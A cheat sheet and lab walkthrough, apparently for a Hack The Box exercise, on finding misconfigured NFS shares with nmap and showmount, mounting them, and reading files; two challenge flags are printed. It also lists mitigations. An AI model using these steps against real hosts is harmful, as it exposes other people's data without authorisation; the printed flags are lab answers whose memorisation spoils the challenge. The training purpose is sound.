# NFS 

## 🔹 Basics
- NFS = Linux file sharing service
- Ports:
  - 111 → RPC
  - 2049 → NFS
- No strong auth → based on UID/GID

---

## 🔹 Enumeration

### Scan
    nmap -p111,2049 -sV -sC <IP>

### NFS Scripts
    sudo nmap --script nfs* <IP> -p111,2049

### List Shares
    showmount -e <IP>

---

## 🔹 Exploitation

### Mount Share
    mkdir target-NFS
    sudo mount -t nfs <IP>:/ ./target-NFS -o nolock

### Browse Files
    cd target-NFS
    tree .
    ls -lh

---

## 🔹 File Access

### Read Files
    cat <file>

### Check Ownership
    ls -l
    ls -n

👉 UID/GID mapping important

---

## 🔹 Common Findings
- Exposed shares (wide IP range)
- Sensitive files (flags, SSH keys)
- nobody:nogroup → anonymous access

---

## 🔹 Dangerous Configs
- rw → write access
- no_root_squash → root access
- insecure → high ports allowed

---

## 🔹 Attack Flow
1. Scan (111, 2049)
2. showmount
3. mount share
4. explore
5. loot files

---

## 🔹 Key Tip
👉 Always check NFS → easy win in labs


# NFS Enumeration & Exploitation Lab

## 🧠 Objective
Enumerate NFS service, mount exposed shares, and retrieve sensitive files (flags).

---

## 🔍 Step 1: Initial Enumeration

### Scan Target
Identify open ports and services.

    nmap -p111,2049 -sV -sC -A 10.129.202.5

### Key Findings
- Port 111 → rpcbind
- Port 2049 → NFS
- OS → Linux (Kernel 4.x / 5.x)

👉 NFS service detected → potential misconfiguration

---

## 🔍 Step 2: NFS Script Enumeration

Run NFS-related NSE scripts:

    sudo nmap --script nfs* 10.129.202.5 -sV -p111,2049

### Result
- NFS version: 3-4
- nlockmgr service exposed

---

## 🔍 Step 3: Identify Exported Shares

List available NFS shares:

    showmount -e 10.129.202.5

### Output
    /var/nfs      10.0.0.0/8
    /mnt/nfsshare 10.0.0.0/8

👉 Misconfiguration:
- Shares accessible to wide network range (10.0.0.0/8)

---

## 📂 Step 4: Mount NFS Share

### Create Mount Directory

    mkdir target-NFS



### ✅ Correct Mount Command

    sudo mount -t nfs 10.129.202.5:/ ./target-NFS/ -o nolock

---

## 📁 Step 5: Explore Mounted Share

Navigate into mounted directory:

    cd target-NFS
    tree .

### Structure

    .
    ├── mnt/nfsshare/flag.txt
    └── var/nfs/flag.txt

---

## 🚩 Step 6: Retrieve Flags

### Flag 1

    cd mnt/nfsshare
    cat flag.txt

Flag:
    HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}

---

### Flag 2

    cd ../../var/nfs
    cat flag.txt

Flag:
    HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}

---

## 🔐 Step 7: Permission Analysis

Check ownership:

    ls -lh
    ls -n var/nfs/

### Observation
- Owner: nobody:nogroup
- UID/GID: 65534

👉 Indicates:
- Anonymous / unauthenticated access
- No root squash enforcement (or weak config)

---

## ⚠️ Vulnerability Summary

### Misconfigurations Identified:
- NFS shares exposed to large network range (10.0.0.0/8)
- No authentication required
- Sensitive files accessible
- Improper permission handling

---

## 🧨 Attack Path Summary

1. Scan → Identify NFS (111, 2049)
2. Enumerate shares → `showmount`
3. Mount share locally
4. Browse filesystem
5. Extract sensitive data

---

## 🛡️ Mitigation

- Restrict NFS access to specific IPs
- Enable root squash
- Use authentication (Kerberos)
- Avoid exposing sensitive files
- Apply proper file permissions

---

## 💡 Key Takeaways

- NFS is often **low-hanging fruit**
- Always check:
  - `showmount -e`
  - mount permissions
- Misconfigured shares = **direct data exposure**
